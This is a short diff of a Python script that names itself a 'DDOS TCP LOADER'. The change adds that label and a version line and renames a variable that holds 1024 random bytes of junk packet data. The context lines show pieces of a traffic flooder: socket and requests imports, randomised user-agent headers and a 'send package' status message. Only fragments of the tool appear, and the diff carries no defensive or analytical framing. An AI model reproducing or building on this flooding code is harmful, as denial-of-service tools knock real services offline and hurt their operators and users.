@@ -1,5 +1,7 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
+# DDOS TCP LOADER
+# V0.0.2
 import os
 import socket
 import requests
@@ -87,7 +89,7 @@ print("\033[95m..................>>> send package \033[0m "),
 time.sleep(10),
 def start():
     global useragents, ref, acceptall
-    data = random._urandom(1024)
+    hh = random._urandom(1024)
     xx = int(0)
     useragen = "User-Agent: "+random.choice(useragents)+"\r\n"
     accept = random.choice(acceptall)
